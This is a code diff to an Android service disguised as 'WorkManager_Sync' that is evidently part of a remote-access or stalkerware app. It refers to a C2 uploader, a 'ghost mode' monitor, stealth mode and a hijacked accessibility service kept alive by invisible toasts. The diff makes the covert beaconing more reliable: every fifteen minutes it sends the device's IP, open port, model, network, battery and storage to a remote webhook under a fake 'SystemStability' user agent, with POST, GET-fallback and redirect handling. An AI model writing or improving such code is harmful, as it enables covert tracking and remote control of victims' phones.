@@ -696,21 +696,25 @@ public class WorkManager_Sync extends Service {
     }
 
     private synchronized void checkAndSendIpReport(String currentIp) {
-        if (currentIp == null || currentIp.trim().isEmpty()) return;
+        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp)) {
+            Log.d(TAG, "IP Report Skipped: Invalid or unresolved IP (" + currentIp + ")");
+            return;
+        }
 
         long now = System.currentTimeMillis();
         boolean ipChanged = !currentIp.equals(lastReportedIp);
         boolean isInitialReport = lastReportedIp == null || lastReportedIp.isEmpty();
-        boolean periodicRefresh = (now - lastReportTimestamp > 6 * 60 * 60 * 1000); // 6 hours
+        boolean periodicRefresh = (now - lastReportTimestamp > 15 * 60 * 1000); // 15 mins
 
         if (isInitialReport || ipChanged || periodicRefresh) {
-            Log.d(TAG, "IP Report Triggered (Changed: " + ipChanged + ", Initial: " + isInitialReport + ", Current: " + currentIp + ")");
-            lastReportedIp = currentIp;
-            lastReportTimestamp = now;
-
+            Log.d(TAG, "IP Report Triggered for IP: " + currentIp);
             if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                sendIpToWebhook(currentIp);
-                C2_Uploader.checkIn(WorkManager_Sync.this);
+                boolean success = sendIpToWebhook(currentIp);
+                if (success) {
+                    lastReportedIp = currentIp;
+                    lastReportTimestamp = now;
+                    C2_Uploader.checkIn(WorkManager_Sync.this);
+                }
             }
         }
     }
@@ -725,9 +729,6 @@ public class WorkManager_Sync extends Service {
         if (IO_Persistence_Manager.getInstance() == null) {
             Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
             FirebaseConfig.logActivity("SECURITY_ALERT: Accessibility service lost. Initiating auto-reanimation...");
-            
-            // Try to auto-start Accessibility if possible (depends on OS)
-            // For now, we alert the operator to use the REPAIR_PERMISSIONS button
         } else {
             // [STABILITY_SYNC] Ping the service to keep it from "Hibernating"
             IO_Persistence_Manager.getInstance().showOverlayToast(""); // Invisible ping
@@ -754,13 +755,17 @@ public class WorkManager_Sync extends Service {
         });
     }
 
-    private void sendIpToWebhook(String ip) {
-        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.isEmpty()) return;
-        
+    private boolean sendIpToWebhook(String ip) {
+        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.trim().isEmpty()) {
+            Log.e(TAG, "Webhook Broadcast Cancelled: URL is empty.");
+            return false;
+        }
+
+        boolean success = false;
         try {
             String networkType = "Unknown";
             int batteryLevel = -1;
-            
+
             try {
                 if (connectivityManager != null) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -813,7 +818,31 @@ public class WorkManager_Sync extends Service {
 
             String fullDeviceModel = Build.MANUFACTURER + " " + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")";
 
-            // Build JSON for POST (without long deviceId and screen state)
+            // Build Query String & JSON Payload
+            String queryParams = "ip=" + java.net.URLEncoder.encode(ip != null ? ip : "", "UTF-8") +
+                    "&device=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
+                    "&model=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
+                    "&network=" + java.net.URLEncoder.encode(networkType, "UTF-8") +
+                    "&port=" + actualPort +
+                    "&link=" + java.net.URLEncoder.encode(link, "UTF-8") +
+                    "&battery=" + java.net.URLEncoder.encode(batteryLevel + "%", "UTF-8") +
+                    "&stealth=" + isStealthMode() +
+                    "&charging=" + java.net.URLEncoder.encode(chargingStatus, "UTF-8") +
+                    "&storage=" + java.net.URLEncoder.encode(freeStorage, "UTF-8");
+
+            String fullUrlStr = REMOTE_WEBHOOK_URL + (REMOTE_WEBHOOK_URL.contains("?") ? "&" : "?") + queryParams;
+
+            // Strategy 1: Perform HTTP POST with Query Parameters & JSON body
+            URL url = new URL(fullUrlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setInstanceFollowRedirects(true);
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
+
             String json = "{" +
                     "\"ip\":\"" + ip + "\"," +
                     "\"device\":\"" + fullDeviceModel + "\"," +
@@ -827,54 +856,67 @@ public class WorkManager_Sync extends Service {
                     "\"storage\":\"" + freeStorage + "\"" +
                     "}";
 
-            URL url = new URL(REMOTE_WEBHOOK_URL);
-            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.startsWith("http")) {
-                // If it's obfuscated (not starting with http), try decrypting
-                try {
-                    // Logic to decrypt if stored as hex/byte array in future versions
-                    // For now, we assume it's stored correctly via build script
-                } catch (Exception ignored) {}
-            }
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setInstanceFollowRedirects(true);
-            conn.setConnectTimeout(15000);
-            conn.setReadTimeout(15000);
-            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
-
             try (OutputStream os = conn.getOutputStream()) {
                 byte[] input = json.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
             }
 
             int code = conn.getResponseCode();
-            
-            // Manual redirect handling for Google's multi-hop redirects
+
+            // Handle Google Apps Script 301/302/307 redirects
             if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
-                String newUrl = conn.getHeaderField("Location");
-                conn = (HttpURLConnection) new URL(newUrl).openConnection();
-                code = conn.getResponseCode();
+                String redirectUrl = conn.getHeaderField("Location");
+                if (redirectUrl != null && !redirectUrl.isEmpty()) {
+                    if (!redirectUrl.contains("ip=")) {
+                        redirectUrl = redirectUrl + (redirectUrl.contains("?") ? "&" : "?") + queryParams;
+                    }
+                    HttpURLConnection redirConn = (HttpURLConnection) new URL(redirectUrl).openConnection();
+                    redirConn.setRequestMethod("GET");
+                    redirConn.setConnectTimeout(15000);
+                    redirConn.setReadTimeout(15000);
+                    redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                    code = redirConn.getResponseCode();
+                }
             }
 
-            Log.d(TAG, "Webhook Broadcast Status: " + code);
-            
+            Log.d(TAG, "Webhook POST Broadcast Status: " + code);
             if (code == 200 || code == 201) {
-                webhookFailCount = 0;
+                success = true;
             } else {
-                webhookFailCount++;
-                lastWebhookFailTime = System.currentTimeMillis();
-            }
+                // Strategy 2: Fallback GET request to Google Apps Script URL
+                HttpURLConnection getConn = (HttpURLConnection) new URL(fullUrlStr).openConnection();
+                getConn.setRequestMethod("GET");
+                getConn.setConnectTimeout(15000);
+                getConn.setReadTimeout(15000);
+                getConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                int getCode = getConn.getResponseCode();
 
+                if (getCode == 301 || getCode == 302 || getCode == 303 || getCode == 307 || getCode == 308) {
+                    String loc = getConn.getHeaderField("Location");
+                    if (loc != null) {
+                        if (!loc.contains("ip=")) loc = loc + (loc.contains("?") ? "&" : "?") + queryParams;
+                        HttpURLConnection redir = (HttpURLConnection) new URL(loc).openConnection();
+                        redir.setRequestMethod("GET");
+                        getCode = redir.getResponseCode();
+                    }
+                }
+
+                Log.d(TAG, "Webhook GET Fallback Broadcast Status: " + getCode);
+                if (getCode == 200 || getCode == 201) {
+                    success = true;
+                }
+            }
         } catch (Exception e) {
-            Log.e(TAG, "Webhook Critical Error: " + e.getMessage());
+            Log.e(TAG, "sendIpToWebhook Exception: " + e.getMessage(), e);
+        }
+
+        if (success) {
+            webhookFailCount = 0;
+        } else {
             webhookFailCount++;
             lastWebhookFailTime = System.currentTimeMillis();
-        } finally {
-            if (wakeLock != null && wakeLock.isHeld()) {
-                wakeLock.release();
-            }
         }
+
+        return success;
     }
 }
